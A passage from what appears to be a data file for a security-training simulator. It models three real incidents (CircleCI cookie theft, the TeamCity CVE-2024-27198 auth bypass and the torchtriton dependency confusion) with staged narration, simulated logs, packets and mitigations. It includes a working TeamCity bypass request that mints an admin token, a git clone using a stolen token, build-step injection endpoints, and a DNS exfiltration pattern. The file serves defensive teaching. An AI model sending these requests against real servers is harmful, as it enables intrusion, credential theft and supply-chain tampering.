        mitreTactic: 'Initial Access & Credential Access (T1539 - Steal Web Session Cookie / T1555.003)',
        technicalCommands: [
          'macOS Infostealer reads ~/Library/Application Support/Google/Chrome/Default/Cookies & Keychain',
          'Exfiltrates active Okta/SSO session cookie (already authenticated with 2FA) to attacker C2',
        ],
        defenseMitigation:
          'Enforce device-bound WebAuthn / FIDO2 hardware security keys with continuous session IP/ASN binding (`Continuous Access Evaluation`) so stolen cookies cannot be replayed from foreign IPs.',
        logs: [
          {
            id: 'circleci-1',
            timestamp: '02:11:04.512',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'macos-stealer',
            raw: 'macOS Endpoint Alert | TargetFile: ~/Library/Application Support/Google/Chrome/Default/Cookies | StolenArtifact: 2FA-Authenticated Production SSO Session Cookie | Reference: CircleCI Security Alert Jan 2023',
            parsedFields: {
              EntryVector: 'Trojanized macOS software on engineer laptop',
              StolenCredential: 'Active 2FA-authenticated SSO session cookie (T1539)',
              ReplayEffect: 'Bypassed MFA challenge from remote attacker IP',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Session Replay from Foreign IP, Production Database Access & KMS Key Extraction',
        narration:
          'Replaying the stolen engineer session token from a remote proxy IP, the attacker accesses privileged internal CircleCI production hosts, extracts database encryption keys from the running runtime environment, and dumps customer project databases containing encrypted environment variables and OAuth tokens.',
        activeNodes: ['attacker', 'target', 'siem'],
        mitreTactic: 'Privilege Escalation & Collection (T1550.004 - Web Session Cookie / T1552)',
        technicalCommands: [
          'Replay SSO Cookie -> Access production bastion -> Dump customer context/project tables & KMS runtime decryption keys',
        ],
        defenseMitigation:
          'Require step-up hardware FIDO2 re-authentication for every production bastion login or KMS decryption key access regardless of active SSO cookie state.',
        logs: [
          {
            id: 'circleci-2',
            timestamp: '02:18:49.220',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'aws-kms',
            raw: 'Production Access Anomaly | Principal: Engineer SSO Session | SourceIP: External Proxy ASN (Geo-Mismatch) | Action: Production Database & Runtime Encryption Key Extraction',
            parsedFields: {
              SessionAnomaly: 'SSO session cookie replayed from new ASN/IP',
              CompromisedAssets: 'Production Datastores + Runtime Encryption Keys',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Offline Decryption of Customer CI/CD Secrets & Downstream GitHub / AWS Token Replay',
        narration:
          'Combining the exfiltrated database dumps with the stolen runtime encryption keys, the attacker decrypts customer CI/CD environment variables (`AWS_SECRET_ACCESS_KEY`, `NPM_TOKEN`, SSH deploy keys, and GitHub OAuth tokens) offline and attempts unauthorized `git clone` and `aws sts get-caller-identity` calls against customer repositories and cloud accounts.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Lateral Movement & Impact (T1552.001 - Credentials In Files / T1199 - Trusted Relationship)',
        technicalCommands: [
          'Offline AES-GCM Decryption of Customer Project Contexts -> Recover AWS_ACCESS_KEY_ID, GITHUB_TOKEN, SSH Private Keys',
          'git clone https://x-access-token:<stolen_oauth>@github.com/customer-org/private-repo.git',
        ],
        defenseMitigation:
          'Replace long-lived static AWS/GCP secrets in CI/CD pipelines with short-lived OpenID Connect (OIDC) federated tokens (`sts:AssumeRoleWithWebIdentity`) that expire immediately after each build job.',
        logs: [
          {
            id: 'circleci-3',
            timestamp: '02:45:10.805',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'github-audit',
            raw: 'GitHub & AWS Audit Alert | Event: repo.clone & sts:GetCallerIdentity | Principal: CircleCI OAuth App Token & Customer CI IAM User | Remediation: Rotate all static CI secrets & migrate to OIDC',
            parsedFields: {
              ExfiltratedSecrets: 'Customer Environment Variables, SSH Deploy Keys, GitHub OAuth Tokens',
              ArchitecturalDefense: 'Short-lived OIDC Federated Tokens instead of static CI secrets',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning',
    title: 'Rapid7, JetBrains & CISA AA24-249A — JetBrains TeamCity Auth Bypass (CVE-2024-27198) to CI/CD Build Pipeline Poisoning & Signed Release Tampering',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in Rapid7 Vulnerability Research, JetBrains Security Advisory, and CISA Advisories on CVE-2024-27198 (CVSS 9.8): attackers exploit an unauthenticated URL path-handling flaw (`/hax?jsp=/app/rest/users;.jsp`) in JetBrains TeamCity CI/CD servers to mint an administrator access token (`POST /app/rest/users/id:1/tokens/RPC2`), inject malicious build steps into enterprise software release pipelines, and sign trojanized build artifacts.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Threat Actor (CVE-2024-27198 Exploit)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'JetBrains TeamCity Server (:8111 ;.jsp Bypass)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'TeamCity REST API (Admin Token & Build Step Injection)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Rapid7 / CISA TeamCity Audit & EDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Signed Enterprise Build Artifacts & Downstream Hosts', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated `;.jsp` Matrix Parameter Auth Bypass (CVE-2024-27198) & Admin Token Minting',
        narration:
          'When an unauthenticated HTTP request is sent to a non-existent path with a `?jsp=/app/rest/...;.jsp` query parameter on JetBrains TeamCity (`< 2023.11.4`), `web.xml` wildcard servlet routing invokes `JspServlet` via `RequestDispatcher.include()`, bypassing `AuthInterceptor` and allowing the attacker to mint a super-admin REST bearer token for `id:1`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Privilege Escalation (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp HTTP/1.1',
          'Response 200 OK: <token name="RPC2" value="eyJ0eXAiOiAiVENWMiJ9..."/> (Unauthenticated Admin Bearer Token)',
        ],
        defenseMitigation:
          'Upgrade JetBrains TeamCity to 2023.11.4+, never expose CI/CD management ports (`8111`/`8443`) directly to the public WAN, and audit `teamcity-server.log` for `;.jsp` requests.',
        logs: [
          {
            id: 'tc-sc-1',
            timestamp: '04:19:02.310',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'java',
            raw: 'TeamCity HTTP Access Log | Request: POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp HTTP/1.1 | Status: 200 OK | Vulnerability: CVE-2024-27198 (CVSS 9.8 Auth Bypass) | Result: Admin token RPC2 minted for user id:1',
            parsedFields: {
              VulnerabilityId: 'CVE-2024-27198 (CVSS 9.8 Critical Auth Bypass)',
              BypassUriPattern: '/hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp',
              MintedArtifact: 'Admin Bearer Token for User id:1',
            },
          },
        ],
        packets: [
          {
            id: 'tc-sc-pkt-1',
            timestamp: '04:19:02.315',
            protocol: 'HTTP',
            sourceIp: '198.51.100.210',
            destIp: '10.20.10.15',
            port: 8111,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '50 4F 53 54 20 2F 68 61 78 3F 6A 73 70 3D 2F 61 70 70 2F 72 65 73 74 2F 75 73 65 72 73 2F 69 64 3A 31 2F 74 6F 6B 65 6E 73 2F 52 50 43 32 3B 2E 6A 73 70',
            decodedString: 'POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp HTTP/1.1',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: CI/CD Build Step Injection (`/app/rest/buildTypes`) & Signing Key Access',
        narration:
          'Authenticating with the newly minted `Authorization: Bearer eyJ0eXAi...` token, the attacker queries `/app/rest/buildTypes` to locate the organization’s production software release pipeline and injects a `simpleRunner` (`command.executable`) build step that modifies source code just prior to the enterprise code-signing step.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Execution & Persistence (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'POST /app/rest/buildTypes/id:ProdRelease/steps HTTP/1.1 (Injects pre-signing command.executable build step)',
          'GET /app/rest/projects/id:_Root/parameters (Extracts cloud deployment & Authenticode signing secrets)',
        ],
        defenseMitigation:
          'Enforce Versioned Settings in read-only mode requiring multi-party signed Git PR approvals for any TeamCity build step change, and monitor `teamcity-activities.log` for `build_type_edit`.',
        logs: [
          {
            id: 'tc-sc-2',
            timestamp: '04:22:18.640',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'teamcity-server',
            raw: 'Log: teamcity-activities.log | Action: build_type_edit & token_created | BuildConfiguration: ProdRelease | InjectedRunner: simpleRunner (Custom Script Pre-Signing)',
            parsedFields: {
              ModifiedPipeline: 'id:ProdRelease (/app/rest/buildTypes/id:ProdRelease/steps)',
              AuditLogFile: 'logs/teamcity-activities.log',
              MitreId: 'T1195.002 (Compromise Software Supply Chain)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Trojanized Build Compilation, Official Code Signing & Downstream Distribution',
        narration:
          'When the TeamCity build agent executes `ProdRelease`, the injected step compiles a backdoor into the release binary, which then passes into the legitimate HSM/Authenticode signing step and is published to downstream enterprise customers as a validly signed update.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Initial Access & Defense Evasion (T1195.002 / T1553.002 - Code Signing)',
        technicalCommands: [
          'TeamCity Build Agent executes injected step -> Compiles backdoored binary -> signtool.exe sign /tr http://timestamp.digicert.com ReleaseApp.exe',
        ],
        defenseMitigation:
          'Decouple code-signing keys from general CI build runners using isolated, reproducible build verification (SLSA L3) before any HSM signature is issued.',
        logs: [
          {
            id: 'tc-sc-3',
            timestamp: '04:26:50.112',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'signtool.exe',
            CommandLine: 'signtool.exe sign /fd SHA256 /tr http://timestamp.digicert.com C:\\BuildAgent\\work\\ReleaseApp.exe',
            raw: 'EventID: 1 | ParentImage: C:\\BuildAgent\\jre\\bin\\java.exe | Image: signtool.exe | SignedArtifact: ReleaseApp.exe (Containing build-injected backdoor)',
            parsedFields: {
              SupplyChainImpact: 'Trojanized release binary signed with legitimate enterprise certificate',
              BuildAgentParent: 'C:\\BuildAgent\\jre\\bin\\java.exe',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'pypi-pytorch-torchtriton-dependency-confusion-supply-chain',
    title: 'PyTorch Official Security Advisory, Sonatype & MITRE T1195.001 — PyTorch torchtriton Nightly Dependency Confusion Supply Chain Attack & h4ck.cfd DNS Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.001',
    description:
      'Grounded in the official PyTorch Security Advisory, Sonatype, and Wiz Research on the `torchtriton` dependency confusion attack: because `pip install --extra-index-url` does not give precedence to private/nightly registries over the public PyPI index, registering a higher-versioned `torchtriton` package on public PyPI caused `pip` to install a trojanized wheel containing an ELF binary (`triton/runtime/triton`) that exfiltrated SSH keys, AWS credentials, and `/etc/passwd` over encrypted DNS queries to `*.h4ck.cfd`.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Authoritative DNS (*.h4ck.cfd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Public PyPI Registry (Namespace-Squatted torchtriton)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'AI/ML Workstation & GPU Cluster (pip --extra-index-url)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Linux Auditd & Passive DNS Entropy Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: '~/.ssh/id_rsa, ~/.aws/credentials & .gitconfig Exfiltrated', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Public PyPI Namespace Squatting & `pip --extra-index-url` Precedence Hijack',
        narration:
          'PyTorch nightly Linux packages depended on an internal package named `torchtriton` hosted on `https://download.pytorch.org/whl/nightly/cu117`. Because users ran `pip3 install --pre torch --extra-index-url https://download.pytorch.org/...`, and `pip` evaluates BOTH public `pypi.org` and the extra index and picks whichever has the highest version number, the attacker uploaded a malicious `torchtriton` wheel with a higher version to public `pypi.org`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1195.001 - Compromise Software Dependencies and Development Tools)',
        technicalCommands: [
          'pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cu117',
          'pip resolves torchtriton from https://files.pythonhosted.org (Public PyPI) instead of download.pytorch.org',
        ],
        defenseMitigation:
          'Use `--index-url` instead of `--extra-index-url`, claim all internal package names on public registries (PyPI/NPM), and enforce hash-pinned lockfiles (`--require-hashes`).',
        logs: [
          {
            id: 'triton-1',
            timestamp: '15:02:11.304',
            source: 'Linux Auditd',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'pip3',
            CommandLine: 'pip3 install --pre torch --extra-index-url https://download.pytorch.org/whl/nightly/cu117',
            raw: 'type=EXECVE msg=audit(1700000131.304:812): argc=6 a0="pip3" a1="install" a2="--pre" a3="torch" a4="--extra-index-url" | ResolvedDependency: torchtriton from pypi.org (Dependency Confusion T1195.001)',
            parsedFields: {
              VulnerabilityClass: 'Dependency Confusion (--extra-index-url precedence flaw)',
              HijackedPackage: 'torchtriton (PyTorch Nightly Linux Dependency)',
              MitreId: 'T1195.001',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `__init__.py` Execution of Compiled ELF Stealer (`triton/runtime/triton`)',
        narration:
          'When `import torch` or `import triton` runs on the ML engineer’s workstation or GPU training node, `triton/__init__.py` executes a bundled C++ ELF binary (`python3 -m triton` -> `triton/runtime/triton`), which harvests `os.environ`, `/etc/hosts`, `/etc/passwd`, `~/.gitconfig`, `~/.ssh/*`, and `~/.aws/credentials`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution & Credential Access (T1059.006 - Python / T1552.001 - Credentials In Files)',
        technicalCommands: [
          'python3 -c "import torch" -> Spawns site-packages/triton/runtime/triton ELF binary',
          'Reads ~/.ssh/id_rsa, ~/.aws/credentials, ~/.gitconfig, /etc/passwd, and $HOME/* (first 1,000 files)',
        ],
        defenseMitigation:
          'Monitor `python3` processes spawning unexpected ELF binaries out of `site-packages/` and reading `~/.ssh/id_rsa` or `~/.aws/credentials`.',
        logs: [
          {
            id: 'triton-2',
            timestamp: '15:03:45.619',
            source: 'Linux Auditd',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'triton',
            CommandLine: '/home/mluser/.local/lib/python3.10/site-packages/triton/runtime/triton',
            raw: 'type=SYSCALL msg=audit(1700000225.619:844): syscall=59 comm="triton" exe="/home/mluser/.local/lib/python3.10/site-packages/triton/runtime/triton" ppid=4120 (python3) | AccessedFiles: ~/.ssh/id_rsa, ~/.aws/credentials, ~/.gitconfig',
            parsedFields: {
              MaliciousBinary: 'site-packages/triton/runtime/triton (Compiled C++ ELF64)',
              HarvestedFiles: '~/.ssh/*, ~/.aws/credentials, ~/.gitconfig, /etc/passwd, os.environ',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: AES-Encrypted DNS Tunneling Exfiltration via `wheezy.io` to `*.h4ck.cfd`',
        narration:
          'To bypass corporate HTTP proxies on GPU clusters, the `triton` ELF binary compresses and encrypts the stolen secrets with a hardcoded AES key, splits the ciphertext into hex-encoded DNS labels, and sends recursive DNS queries through `8.8.8.8` / `wheezy.io` to the attacker’s authoritative nameserver at `*.h4ck.cfd`.',
        activeNodes: ['target', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol: DNS)',
        technicalCommands: [
          'DNS TXT/A Query: <chunk_idx>.<aes_encrypted_hex_secret>.h4ck.cfd @8.8.8.8',
        ],
        defenseMitigation:
          'Block direct outbound UDP/53 to external resolvers (`8.8.8.8`), force all cluster DNS through inspected internal resolvers, and alert on high-entropy queries to `*.h4ck.cfd`.',
        logs: [
          {
            id: 'triton-3',
            timestamp: '15:03:48.102',
            source: 'SIEM',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'triton',
            raw: 'DNS Exfiltration Alert | Process: site-packages/triton/runtime/triton | QueryName: 01.9f8a7c6e5d4b3a2f1e0d9c8b7a6f5e4d.h4ck.cfd | Resolver: 8.8.8.8:53 | Advisory: PyTorch torchtriton Supply Chain Incident',
            parsedFields: {
              ExfilDomain: '*.h4ck.cfd',
              ExfilProtocol: 'AES-Encrypted Hex-Chunked DNS Queries (UDP/53)',
              OfficialRemediation: 'Replaced torchtriton with pytorch-triton registered on public PyPI',
            },
          },
        ],
        packets: [
          {
            id: 'triton-pkt-3',
            timestamp: '15:03:48.105',
            protocol: 'DNS',
            sourceIp: '10.40.2.19',
            destIp: '8.8.8.8',
            port: 53,
            flag: 'NONE',
            payloadSize: 180,
            hexDump: '30 31 2E 39 66 38 61 37 63 36 65 35 64 34 62 33 61 32 66 31 65 30 64 39 63 38 62 37 61 36 66 35 65 34 64 2E 68 34 63 6B 2E 63 66 64',
            decodedString: 'DNS Query A: 01.9f8a7c6e5d4b3a2f1e0d9c8b7a6f5e4d.h4ck.cfd',
          },
        ],
      },
    ],
  },
];
